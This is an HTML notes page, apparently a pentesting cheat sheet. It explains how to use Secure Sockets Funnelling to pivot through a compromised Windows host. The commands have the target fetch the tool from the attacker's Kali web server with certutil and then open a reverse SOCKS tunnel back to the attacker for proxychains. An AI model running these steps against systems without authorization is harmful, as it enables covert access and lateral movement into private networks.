<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Secure Sockets Funnelling (SSF)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Secure Sockets Funnelling (SSF)</h1><br /><br />Github: <a
      href="https://securesocketfunneling.github.io/ssf/#home" target="_blank" target="_blank">https://securesocketfunneling.github.io/ssf/#home</a><br /><br />SSF
    is a cross-platform tool which allows secure traffic routing of both TCP and UDP packets in a variety of
    configurations.<br />SSF re uire 2 components to work:<br /> ◇ <strong>ssfd</strong> → SSF Server that listen for
    communications<br /> ◇ <strong>ssf</strong> → SSF Client connect to the SSF Server<br /><br /><br /><br /><strong>
      <h3>Set Up</h3>
    </strong><br />On the attacker machine download<br />
    <div class="codebox">
      <div class="codebox">git&nbsp;clone&nbsp;https://github.com/DenFox93/ssf.git</div>
    </div><br /><br />1. Create Web Server on the Attacker machine<br />
    <div class="codebox">
      <div class="codebox">cd&nbsp;ssf<br />python3&nbsp;-m&nbsp;http.server</div>
    </div><br /> <a href=""><img src="images/2161-1.png" alt="images/2161-1.png" /></a><br />2. Download zip file on the
    Windows machine and extract it<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;cd&nbsp;ssf-win-i386-3.0.0<br />C:\&gt;&nbsp;certutil&nbsp;-urlcache&nbsp;-f&nbsp;http://&lt;kali&nbsp;ip&gt;:8000/ssf-win-i386-3.0.0.zip&nbsp;ssf-win-i386-3.0.0.zip<br />C:\&gt;&nbsp;powershell&nbsp;&nbsp;&nbsp;#start&nbsp;powershell<br />PS&gt;&nbsp;Expand-ZipFile&nbsp;C:\Users\pparker\Desktop\ssf-win-i386-3.0.0.zip&nbsp;-Destination&nbsp;C:\Users\pparker\Desktop
      </div>
    </div><br /> <a href=""><img src="images/2161-2.png" alt="images/2161-2.png" /></a><br /> <a href=""><img
        src="images/2161-3.png" alt="images/2161-3.png" /></a><br /> *to extract zip files from powershell 2.0 define
    new function<br />
    <div class="codebox">
      <div class="codebox">function&nbsp;Expand-ZIPFile($file,&nbsp;$destination)<span
          style="color:#000000;font-weight:400">{</span>$shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;shell.application;$zip&nbsp;=&nbsp;$shell.NameSpace($file);&nbsp;foreach($item&nbsp;in&nbsp;$zip.items()){$shell.Namespace($destination).copyhere($item)}<span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br /><br /><br /><br /><strong>Reverse Proxy</strong><br />1. <span
      style="text-decoration:underline;">Attacker machine</span> Server (192.168.59.128): sets ssf up listening on port
    11111 for a connection request from a client.<br />
    <div class="codebox">
      <div class="codebox">cd&nbsp;ssf/ssf-linux-x86_64-3.0.0<br />chmod&nbsp;+x&nbsp;ssfd<br />ssfd&nbsp;-p&nbsp;11111
      </div>
    </div><br /> <a href=""><img src="images/2161-4.png" alt="images/2161-4.png" /></a><br /> In /etc/proxychains.conf
    to set up the proxy add the line:<br />
    <div class="codebox">
      <div class="codebox">socks4&nbsp;127.0.0.1&nbsp;22222</div>
    </div><br /> Note that you need to set 127.0.0.1 not other interfaces<br /> <br />2. <span
      style="text-decoration:underline;">Target</span> Client: set up client to connects to the ssfd on the
    Attacker<br />
    <div class="codebox">
      <div class="codebox">ssf&nbsp;-F&nbsp;22222&nbsp;-p&nbsp;11111&nbsp;192.168.59.128</div>
    </div><br /> The -F switch makes SSF forward traffic in the other direction, from the server(ssfd) to the
    client(ssf)<br /> <a href=""><img src="images/2161-5.png"
        alt="images/2161-5.png" /></a><br /><br /><br /><strong>Use Proxychains through Pivot host</strong><br /> <a
      href=""><img src="images/2161-6.png"
        alt="images/2161-6.png" /></a><br /><br /><br /><strong>Bibliography:</strong><br /><a
      href="https://neilsec.com/penetration-testing/how-to-easily-pivot-through-a-windows-host-with-secure-sockets-funnelling-ssf-part-1/" target="_blank">https://neilsec.com/penetration-testing/how-to-easily-pivot-through-a-windows-host-with-secure-sockets-funnelling-ssf-part-1/</a><br /><a
      href="https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/" target="_blank">https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/</a><br /><a
      href="https://ivanitlearning.wordpress.com/2020/04/17/double-pivoting-with-ssf/" target="_blank">https://ivanitlearning.wordpress.com/2020/04/17/double-pivoting-with-ssf/</a>
  </div>
</body>

</html>